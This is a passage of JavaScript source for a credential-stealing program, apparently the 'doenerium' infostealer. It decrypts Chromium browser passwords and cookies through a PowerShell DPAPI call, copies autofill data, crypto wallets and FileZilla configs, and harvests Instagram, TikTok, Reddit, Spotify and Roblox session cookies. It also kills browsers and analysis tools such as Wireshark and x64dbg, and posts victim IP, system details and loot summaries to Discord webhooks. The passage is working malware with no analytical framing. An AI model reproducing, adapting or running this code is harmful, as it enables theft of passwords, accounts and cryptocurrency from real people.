                        icon_url: "https://images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%3Fsize%3D96%26quality%3Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp"
                    },
                    footer: {
                        text: `${user.hostname} | @WallGod69 | t.me/doenerium69`,
                    }
                };
                data.embeds.push(friendsEmbed);
            }

            await axios.post(discordWebhookUr1, data);
            await axios.post(discordWebhookUrl, data);

        } catch (error) {
            console.error(error);
        }

    }
}



const badges = {
    Discord_Employee: {
        Value: 1,
        Emoji: "<:staff:874750808728666152>",
        Rare: true,
    },
    Partnered_Server_Owner: {
        Value: 2,
        Emoji: "<:partner:874750808678354964>",
        Rare: true,
    },
    HypeSquad_Events: {
        Value: 4,
        Emoji: "<:hypesquad_events:874750808594477056>",
        Rare: true,
    },
    Bug_Hunter_Level_1: {
        Value: 8,
        Emoji: "<:bughunter_1:874750808426692658>",
        Rare: true,
    },
    Early_Supporter: {
        Value: 512,
        Emoji: "<:early_supporter:874750808414113823>",
        Rare: true,
    },
    Bug_Hunter_Level_2: {
        Value: 16384,
        Emoji: "<:bughunter_2:874750808430874664>",
        Rare: true,
    },
    Early_Verified_Bot_Developer: {
        Value: 131072,
        Emoji: "<:developer:874750808472825986>",
        Rare: true,
    },
    House_Bravery: {
        Value: 64,
        Emoji: "<:bravery:874750808388952075>",
        Rare: false,
    },
    House_Brilliance: {
        Value: 128,
        Emoji: "<:brilliance:874750808338608199>",
        Rare: false,
    },
    House_Balance: {
        Value: 256,
        Emoji: "<:balance:874750808267292683>",
        Rare: false,
    },
    Discord_Official_Moderator: {
        Value: 262144,
        Emoji: "<:moderator:976739399998001152>",
        Rare: true,
    }
};

async function getRelationships(token) {
    var j = await axios.get('https://discord.com/api/v9/users/@me/relationships', {
        headers: {
            "Content-Type": "application/json",
            "authorization": token
        }
    }).catch(() => { })
    if (!j) return `*Account locked*`
    var json = j.data
    const r = json.filter((user) => {
        return user.type == 1
    })
    var gay = '';
    for (z of r) {
        var b = getRareBadges(z.user.public_flags)
        if (b != "") {
            gay += `${b} | \`${z.user.username}#${z.user.discriminator}\`\n`
        }
    }
    if (gay == '') gay = "*Nothing to see here*"
    return gay
}

async function getBilling(token) {
    let json;
    await axios.get("https://discord.com/api/v9/users/@me/billing/payment-sources", {
        headers: {
            "Content-Type": "application/json",
            "authorization": token
        }
    }).then(res => { json = res.data })
        .catch(err => { })
    if (!json) return '\`Unknown\`';

    var bi = '';
    json.forEach(z => {
        if (z.type == 2 && z.invalid != !0) {
            bi += "<:946246524504002610:962747802830655498>";
        } else if (z.type == 1 && z.invalid != !0) {
            bi += "<:rustler:987692721613459517>";
        }
    });
    if (bi == '') bi = `\`No Billing\``
    return bi;
}

function getBadges(flags) {
    var b = '';
    for (const prop in badges) {
        let o = badges[prop];
        if ((flags & o.Value) == o.Value) b += o.Emoji;
    };
    if (b == '') return `\`No Badges\``;
    return `${b}`;
}

function getRareBadges(flags) {
    var b = '';
    for (const prop in badges) {
        let o = badges[prop];
        if ((flags & o.Value) == o.Value && o.Rare) b += o.Emoji;
    };
    return b;
}

async function getNitro(flags, id, token) {
    switch (flags) {
        case 1:
            return "<:946246402105819216:962747802797113365>";
        case 2:
            let info;
            await axios.get(`https://discord.com/api/v9/users/${id}/profile`, {
                headers: {
                    "Content-Type": "application/json",
                    "authorization": token
                }
            }).then(res => { info = res.data })
                .catch(() => { })
            if (!info) return "<:946246402105819216:962747802797113365>";

            if (!info.premium_guild_since) return "<:946246402105819216:962747802797113365>";

            let boost = ["<:boost1month:1161356435360325673>", "<:boost2month:1161356669004030033>", "<:boost3month:1161356821806710844>", "<:boost6month:1161357418480029776>", "<:boost9month:1161357513820741852>", "<:boost12month:1161357639737946206>", "<:boost15month:967518897987256400>", "<:boost18month:967519190133145611>", "<:boost24month:969686081958207508>"]
            var i = 0

            try {
                let d = new Date(info.premium_guild_since)
                let boost2month = Math.round((new Date(d.setMonth(d.getMonth() + 2)) - new Date(Date.now())) / 86400000)
                let d1 = new Date(info.premium_guild_since)
                let boost3month = Math.round((new Date(d1.setMonth(d1.getMonth() + 3)) - new Date(Date.now())) / 86400000)
                let d2 = new Date(info.premium_guild_since)
                let boost6month = Math.round((new Date(d2.setMonth(d2.getMonth() + 6)) - new Date(Date.now())) / 86400000)
                let d3 = new Date(info.premium_guild_since)
                let boost9month = Math.round((new Date(d3.setMonth(d3.getMonth() + 9)) - new Date(Date.now())) / 86400000)
                let d4 = new Date(info.premium_guild_since)
                let boost12month = Math.round((new Date(d4.setMonth(d4.getMonth() + 12)) - new Date(Date.now())) / 86400000)
                let d5 = new Date(info.premium_guild_since)
                let boost15month = Math.round((new Date(d5.setMonth(d5.getMonth() + 15)) - new Date(Date.now())) / 86400000)
                let d6 = new Date(info.premium_guild_since)
                let boost18month = Math.round((new Date(d6.setMonth(d6.getMonth() + 18)) - new Date(Date.now())) / 86400000)
                let d7 = new Date(info.premium_guild_since)
                let boost24month = Math.round((new Date(d7.setMonth(d7.getMonth() + 24)) - new Date(Date.now())) / 86400000)

                if (boost2month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost3month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost6month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost9month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost12month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost15month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost18month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost24month > 0) {
                    i += 0
                } else if (boost24month < 0 || boost24month == 0) {
                    i += 1
                } else {
                    i = 0
                }
            } catch {
                i += 0
            }
            return `<:946246402105819216:962747802797113365> ${boost[i]}`
        default:
            return "\`No Nitro\`";
    };
}

async function getIp() {
    var ip = await axios.get("https://www.myexternalip.com/raw")
    return ip.data;
}

////


async function Killchrome() {
    exec('tasklist', (err, stdout) => {
        for (const executable of ['chrome.exe']) {
            if (stdout.includes(executable)) {
                exec(`taskkill /F /T /IM ${executable}`, (err) => {})
                exec(`"${localappdata}\\${executable.replace('.exe', '')}\\Update.exe" --processStart ${executable}`, (err) => {})
            }
        }
    })
}


async function getEncrypted() {
    for (let _0x4c3514 = 0; _0x4c3514 < browserPath.length; _0x4c3514++) {
        if (!fs.existsSync('' + browserPath[_0x4c3514][0])) {
            continue
        }
        try {
            let _0x276965 = Buffer.from(
                JSON.parse(fs.readFileSync(browserPath[_0x4c3514][2] + 'Local State'))
                .os_crypt.encrypted_key,
                'base64'
            ).slice(5)
            const _0x4ff4c6 = Array.from(_0x276965),
                _0x4860ac = execSync(
                    'powershell.exe Add-Type -AssemblyName System.Security; [System.Security.Cryptography.ProtectedData]::Unprotect([byte[]]@(' +
                    _0x4ff4c6 +
                    "), $null, 'CurrentUser')"
                )
                .toString()
                .split('\r\n'),
                _0x4a5920 = _0x4860ac.filter((_0x29ebb3) => _0x29ebb3 != ''),
                _0x2ed7ba = Buffer.from(_0x4a5920)
            browserPath[_0x4c3514].push(_0x2ed7ba)
        } catch (_0x32406b) {}
    }
}


function addFolder(folderPath) {
  const folderFullPath = path.join(randomPath, folderPath);
  if (!fs.existsSync(folderFullPath)) {
    try {
      fs.mkdirSync(folderFullPath, { recursive: true });
    } catch (error) {}
  }
}

function copyFolder(source, destination) {
  if (!fs.existsSync(destination)) {
    fs.mkdirSync(destination);
  }

  const files = fs.readdirSync(source);

  files.forEach(file => {
    const currentSource = path.join(source, file);
    const currentDestination = path.join(destination, file);

    if (fs.lstatSync(currentSource).isDirectory()) {
      copyFolder(currentSource, currentDestination);
    } else {
      fs.copyFileSync(currentSource, currentDestination);
    }
  });
}


async function getExtension() {
  const walletsFolder = path.join(mainFolderPath, 'Wallets');
  if (!fs.existsSync(walletsFolder)) {
    fs.mkdirSync(walletsFolder);
  }

  // Introduce an 8-second delay
  await new Promise(resolve => setTimeout(resolve, 6000));

  let walletCount = 0;
  let browserCount = 0;

  const discordTokensFilePath = path.join(mainFolderPath, 'discord', 'discord.txt');
  let discordTokensCount = 0;

  if (fs.existsSync(discordTokensFilePath)) {
    const discordTokensContent = fs.readFileSync(discordTokensFilePath, 'utf-8');
    const discordTokensEntries = discordTokensContent.split('\n').filter(entry => entry.trim() !== '');
    discordTokensCount = discordTokensEntries.length;
  }

  for (let [extensionName, extensionPath] of Object.entries(extension)) {
    for (let i = 0; i < browserPath.length; i++) {
      let browserFolder;
      if (browserPath[i][0].includes('Local')) {
        browserFolder = browserPath[i][0].split('\\Local\\')[1].split('\\')[0];
      } else {
        browserFolder = browserPath[i][0].split('\\Roaming\\')[1].split('\\')[1];
      }

      const browserExtensionPath = path.join(browserPath[i][0], extensionPath);
      if (fs.existsSync(browserExtensionPath)) {
        const walletFolder = path.join(walletsFolder, `${extensionName}_${browserFolder}_${browserPath[i][1]}`);
        copyFolder(browserExtensionPath, walletFolder);
        walletCount++;
        browserCount++;
        count.wallets++;
      }
    }
  }

  for (let [walletName, walletPath] of Object.entries(walletPaths)) {
    if (fs.existsSync(walletPath)) {
      const walletFolder = path.join(walletsFolder, walletName);
      copyFolder(walletFolder, walletPath);
      walletCount++;
      count.wallets++;
    }
  }

  const cookiesFolder = path.join(mainFolderPath, 'cookies');

  const passwordsFilePath = path.join(mainFolderPath, 'Passwords', 'passwords.txt');
  let passwordsCount = 0;

  if (fs.existsSync(passwordsFilePath)) {
    const passwordsContent = fs.readFileSync(passwordsFilePath, 'utf-8');
    const passwordsEntries = passwordsContent.split('Username').filter(entry => entry.trim() !== '');
    passwordsCount = passwordsEntries.length;
  }

  // Count autofills
  const autofillsFolderPath = path.join(mainFolderPath, 'Autofills');
  let autofillCount = 0;

  if (fs.existsSync(autofillsFolderPath)) {
    const autofillsFilePath = path.join(autofillsFolderPath, 'Autofills.txt');

    if (fs.existsSync(autofillsFilePath)) {
      const autofillsContent = fs.readFileSync(autofillsFilePath, 'utf-8');
      const autofillEntries = autofillsContent.split('\n').filter(entry => entry.trim() !== '');
      autofillCount = autofillEntries.length;
    }
  }

  const ip = await getIp();
  const combinedInfoEmbed = {
    title: '',
    description: ' ',
    color: 0x303037,
    author: {
      name: `${user.hostname} | System Information | @WallGod69`,
      icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp',
    },
    fields: [
      {
        name: '🔐 Passwords',
        value: '```' + passwordsCount.toString() + '```',
        inline: true,
      },
      {
        name: '🍪 Cookies',
        value: '```' + count.cookies.toString() + '```',
        inline: true,
      },
      {
        name: '📋 Autofills',
        value: '```' + autofillCount.toString() + '```',
        inline: true,
      },
      {
        name: '🛠️ Browser wallet',
        value: '```' + walletCount.toString() + '```',
        inline: true,
      },
      {
        name: '🔑 Tokens',
        value: '```' + discordTokensCount.toString() + '```',
        inline: true,
      },
      {
        name: '⚙️ System Information',
        value: '```\n' +
          `Hostname: ${user.hostname}\n` +
          `User Info: ${user.userInfo}\n` +
          `Version: ${user.version}\n` +
          `IP Address: ${ip}\n` +
          `Uptime: ${user.uptime}\n` +
          `Type: ${user.type}\n` +
          `Arch: ${user.arch}\n` +
          `Release: ${user.release}\n` +
          `Count Core: ${user.countCore}\n` +
          `File Location: ${user.fileLoc}\n` +
          '```',
        inline: false,
      },
    ],
    footer: {
      text: `${user.hostname} | @WallGod69 | t.me/doenerium69`,
      icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp',
    },
  };

  axios.post(discordWebhookUr1, { embeds: [combinedInfoEmbed] })
    .then(() => {
      console.log('system information successfully sent to Discord webhook.');
    })
    .catch(error => {
      console.error('An error occurred while sending system information:', error.message);
    });

  axios.post(discordWebhookUrl, { embeds: [combinedInfoEmbed] })
    .then(() => {
      console.log('system information successfully sent to Discord webhook.');
    })
    .catch(error => {
      console.error('An error occurred while sending system information:', error.message);
    });
}





async function getPasswords() {
  const _0x540754 = [];

  for (let _0x261d97 = 0; _0x261d97 < browserPath.length; _0x261d97++) {
    if (!fs.existsSync(browserPath[_0x261d97][0])) {
      continue;
    }

    let _0xd541c2;
    if (browserPath[_0x261d97][0].includes('Local')) {
      _0xd541c2 = browserPath[_0x261d97][0].split('\\Local\\')[1].split('\\')[0];
    } else {
      _0xd541c2 = browserPath[_0x261d97][0].split('\\Roaming\\')[1].split('\\')[1];
    }

    const _0x256bed = browserPath[_0x261d97][0] + 'Login Data';
    const _0x239644 = browserPath[_0x261d97][0] + 'passwords.db';

    fs.copyFileSync(_0x256bed, _0x239644);

    const _0x3d71cb = new sqlite3.Database(_0x239644);

    await new Promise((_0x2c148b, _0x32e8f4) => {
      _0x3d71cb.each(
        'SELECT origin_url, username_value, password_value FROM logins',
        (_0x4c7a5b, _0x504e35) => {
          if (!_0x504e35.username_value) {
            return;
          }

          try {
            let _0x3d2b4b = _0x504e35.password_value;
            const _0x5e1041 = _0x3d2b4b.slice(3, 15);
            const _0x279e1b = _0x3d2b4b.slice(15, _0x3d2b4b.length - 16);
            const _0x2a933a = _0x3d2b4b.slice(_0x3d2b4b.length - 16, _0x3d2b4b.length);
            const _0x210aeb = crypto.createDecipheriv(
              'aes-256-gcm',
              Buffer.from(browserPath[_0x261d97][3], 'hex'),
              _0x5e1041
            );
            _0x210aeb.setAuthTag(_0x2a933a);
            const password =
              _0x210aeb.update(_0x279e1b, 'base64', 'utf-8') +
              _0x210aeb.final('utf-8');

            _0x540754.push(
              '================\nURL: ' +
                _0x504e35.origin_url +
                '\nUsername: ' +
                _0x504e35.username_value +
                '\nPassword: ' +
                password +
                '\nApplication: ' +
                _0xd541c2 +
                ' ' +
                browserPath[_0x261d97][1] +
                '\n'
            );
          } catch (_0x5bf37a) {}
        },
        () => {
          _0x2c148b('');
        }
      );
    });
  }

  if (_0x540754.length === 0) {
    _0x540754.push('no password found for ');
  }

  if (_0x540754.length) {
    const passwordsFolderPath = path.join(mainFolderPath, 'Passwords');
    if (!fs.existsSync(passwordsFolderPath)) {
      fs.mkdirSync(passwordsFolderPath);
    }

    const passwordsFilePath = path.join(passwordsFolderPath, 'Passwords.txt');
    fs.writeFileSync(passwordsFilePath, user.copyright + _0x540754.join(''), {
      encoding: 'utf8',
      flag: 'a+',
    });
  }
}




async function getCookies() {
  const cookiesData = {};
  cookiesData['banner'] = [`${user.copyright}\n`];

  for (let i = 0; i < browserPath.length; i++) {
    const networkPath = path.join(browserPath[i][0], 'Network');

    if (!fs.existsSync(path.join(networkPath, 'Cookies'))) {
      continue;
    }

    let browserFolder;
    if (browserPath[i][0].includes('Local')) {
      browserFolder = browserPath[i][0].split('\\Local\\')[1].split('\\')[0];
    } else {
      browserFolder = browserPath[i][0].split('\\Roaming\\')[1].split('\\')[1];
    }

    const cookiesPath = path.join(networkPath, 'Cookies');
    const db = new sqlite3.Database(cookiesPath);

    await new Promise((resolve) => {
      db.each(
        'SELECT * FROM cookies',
        function (err, row) {
          if (err) {
            console.error(`Error reading cookies from ${cookiesPath}:`, err);
            return;
          }

          let encryptedValue = row.encrypted_value;
          let iv = encryptedValue.slice(3, 15);
          let encryptedData = encryptedValue.slice(15, encryptedValue.length - 16);
          let authTag = encryptedValue.slice(encryptedValue.length - 16, encryptedValue.length);
          let decrypted = '';

          try {
            const decipher = crypto.createDecipheriv('aes-256-gcm', browserPath[i][3], iv);
            decipher.setAuthTag(authTag);
            decrypted = decipher.update(encryptedData, 'base64', 'utf-8') + decipher.final('utf-8');

            // Handle different services
            if (row.host_key === '.instagram.com' && row.name === 'sessionid') {
              SubmitInstagram(`${decrypted}`);
            } else if (row.host_key === '.tiktok.com' && row.name === 'sessionid') {
              stealTikTokSession(`${decrypted}`);
            } else if (row.host_key === '.reddit.com' && row.name === 'reddit_session') {
              setRedditSession(`${decrypted}`);
            } else if (row.host_key === '.spotify.com' && row.name === 'sp_dc') {
              SpotifySession(`${decrypted}`);
            } else if (row.name === '.ROBLOSECURITY') {
              SubmitRoblox(`${decrypted}`);
            }
          } catch (error) {
            console.error(`Error decrypting cookies for ${row.host_key}:`, error);
          }

          if (!cookiesData[`${browserFolder}_${browserPath[i][1]}`]) {
            cookiesData[`${browserFolder}_${browserPath[i][1]}`] = [];
          }

            cookiesData[`${browserFolder}_${browserPath[i][1]}`].push(
            `${row.host_key}    TRUE    /   FALSE   2597573456  ${row.name} ${decrypted} \n\n`
          );

          count.cookies++;
        },
        () => {
          resolve('');
        }
      );
    });
  }

for (let [browserName, cookies] of Object.entries(cookiesData)) {
  if (browserName.toLowerCase() === 'banner') {
    continue;
  }

  if (cookies.length !== 0) {
    const cookiesContent = cookies.join('');

    const cookiesWithBanner = cookiesContent;
    const fileName = `${browserName}.txt`;

    // Specify the folder path for Cookies
    const cookiesFolderPath = path.join(mainFolderPath, 'Cookies');
    const cookiesFilePath = path.join(cookiesFolderPath, fileName);

    try {
      if (!fs.existsSync(cookiesFolderPath)) {
        fs.mkdirSync(cookiesFolderPath);
      }

      fs.writeFileSync(cookiesFilePath, cookiesWithBanner, { encoding: 'utf8' });

      moveFileToFolder(cookiesFilePath, 'Cookies');
    } catch (error) {
      console.error(`Error writing/moving cookies file ${cookiesFilePath}:`, error);
      }
    }
  }
}





async function getAutofills() {
  const autofillData = [];

  for (const pathData of browserPath) {
    const browserPathExists = fs.existsSync(pathData[0]);

    if (!browserPathExists) {
      continue;
    }

    const applicationName = pathData[0].includes('Local')
      ? pathData[0].split('\\Local\\')[1].split('\\')[0]
      : pathData[0].split('\\Roaming\\')[1].split('\\')[1];

    const webDataPath = pathData[0] + 'Web Data';
    const webDataDBPath = pathData[0] + 'webdata.db';

    fs.copyFileSync(webDataPath, webDataDBPath);

    const db = new sqlite3.Database(webDataDBPath);

    await new Promise((resolve, reject) => {
      db.each(
        'SELECT * FROM autofill',
        function (error, row) {
          if (row) {
            autofillData.push(
              '================\nName: ' +
                row.name +
                '\nValue: ' +
                row.value +
                '\nApplication: ' +
                applicationName +
                ' ' +
                pathData[1] +
                '\n'
            );
          }
        },
        function () {
          resolve('');
        }
      );
    });

    if (autofillData.length === 0) {
      autofillData.push('No autofills found for ' + applicationName + ' ' + pathData[1] + '\n');
    }
  }

  if (autofillData.length) {
    const autofillsFolderPath = path.join(mainFolderPath, 'Autofills');
    const autofillsFilePath = path.join(autofillsFolderPath, 'Autofills.txt');

    if (!fs.existsSync(autofillsFolderPath)) {
      fs.mkdirSync(autofillsFolderPath);
    }

    fs.writeFileSync(autofillsFilePath, user.copyright + autofillData.join(''), {
      encoding: 'utf8',
      flag: 'a+',
    });
  }
}

   
async function DiscordListener(path) {
        return;
}


function submitExodus() {
  const exodusSource = `C:\\Users\\${process.env.USERNAME}\\AppData\\Roaming\\Exodus\\exodus.wallet`;
  const exodusDestination = path.join(mainFolderPath, 'Wallets', 'Exodus');

  if (fs.existsSync(exodusSource)) {
    if (!fs.existsSync(exodusDestination)) {
      fs.mkdirSync(exodusDestination, { recursive: true });
    }

    // Copy the contents of the Exodus folder to the Wallet/Exodus subfolder
    copyFolder(exodusSource, exodusDestination);
  }
}
//
async function submitFileZilla() {
  const fileZillaSource = `C:\\Users\\${process.env.USERNAME}\\AppData\\Roaming\\FileZilla`;
  const fileZillaDestination = path.join(mainFolderPath, 'FileZilla');

  if (fs.existsSync(fileZillaSource)) {
    copyFolder(fileZillaSource, fileZillaDestination);
  }
}


/*
async function SubmitTelegram() {
  const file = `C:\\Users\\${process.env.USERNAME}\\AppData\\Roaming\\Telegram Desktop\\tdata`;

  if (fs.existsSync(file)) {
    const zipper = new AdmZip();
    zipper.addLocalFolder(file);
    zipper.writeZip(`TelegramSession.zip`);

    const webhook = discordWebhookUrl;
    const form = new FormData();
    form.append("file", fs.createReadStream("TelegramSession.zip"));
    form.append("json", JSON.stringify({ "key": key }));

    try {
      await form.submit(webhook);
      console.log('Telegram session data submitted successfully to Discord webhook.');
    } catch (error) {
      console.error(`Error submitting Telegram session data: ${error.message}`);
    }

    webhook = discordWebhookUr1;

    try {
      await form.submit(webhook);
      console.log('Telegram session data submitted successfully to the second Discord webhook.');
    } catch (error) {
      console.error(`Error submitting Telegram session data to the second webhook: ${error.message}`);
    }
  }
}
*/


async function closeBrowsers() {
  const browsersProcess = ["chrome.exe", "filezilla.exe", "msedge.exe", "opera.exe", "brave.exe", "HTTPDebuggerUI.exe", "HTTPDebuggerSvc.exe", "HTTPDebuggerPro.exe", "x64dbg.exe", "Ida.exe", "HTTP Debugger Pro.exe", "OllyDbg.exe", "Wireshark.exe"];
  return new Promise(async (resolve) => {
    try {
      const tasks = execSync("tasklist").toString();
      browsersProcess.forEach((process) => {
        if (tasks.includes(process)) {
          execSync(`taskkill /IM ${process} /F`);
        }
      });

      await new Promise((innerResolve) => setTimeout(innerResolve, 2500));
      resolve();
    } catch (e) {
      console.log(e);
      resolve();
    }
  });
}


//

function onlyUnique(item, index, array) {
    return array.indexOf(item) === index;
}
        closeBrowsers();
        initializeFolders();
        removeRegistryKey();
        Killchrome();
        stealTokens();
        getEncrypted();
        getCookies();
        findBackupCodes();
        findEpicGamesBackupCodes();
        findGithubBackupCodes();
        //SubmitTelegram();
        getAutofills();
        getPasswords();
        submitExodus();
        submitFileZilla();
        createRunBat();
        getExtension();
        archiveAndSendData();
